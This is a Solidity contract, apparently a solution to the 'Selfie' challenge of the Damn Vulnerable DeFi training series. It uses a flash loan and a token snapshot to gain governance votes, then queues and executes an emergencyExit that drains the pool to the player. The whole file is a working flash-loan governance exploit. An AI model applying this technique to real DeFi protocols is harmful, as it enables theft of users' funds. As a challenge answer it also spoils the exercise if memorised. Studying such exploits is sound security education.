// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "./ISimpleGovernance.sol";


contract GovernanceAttacker is IERC3156FlashBorrower{
    address player;
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public governance;


    constructor (address _player, address _pool, address _token, address _governance) {
        player = _player;
        pool = SelfiePool(_pool);
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);
    }

    function run() external {
        uint256 maxTokens = token.balanceOf(address(pool));
        pool.flashLoan(
            IERC3156FlashBorrower(this),
            address(ERC20Snapshot(token)),
            maxTokens,
            abi.encodeWithSignature("something")
        );
    }

    function onFlashLoan(
        address _sender,
        address _token,
        uint256 _amount,
        uint256 _idk,
        bytes calldata  _data
    ) external returns(bytes32){
        token.snapshot();
        token.approve(address(pool), token.balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function queueMoney() external {
        // function we need to run:
        // function emergencyExit(address receiver) external onlyGovernance {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
        governance.queueAction(address(pool), 0, data);
    }
    function giveMoney() external {
        governance.executeAction(1);
    }
    function timecheck() public view returns(uint64) {
        return uint64(2 days);
    }

    // just in case
    receive() external payable {}
}
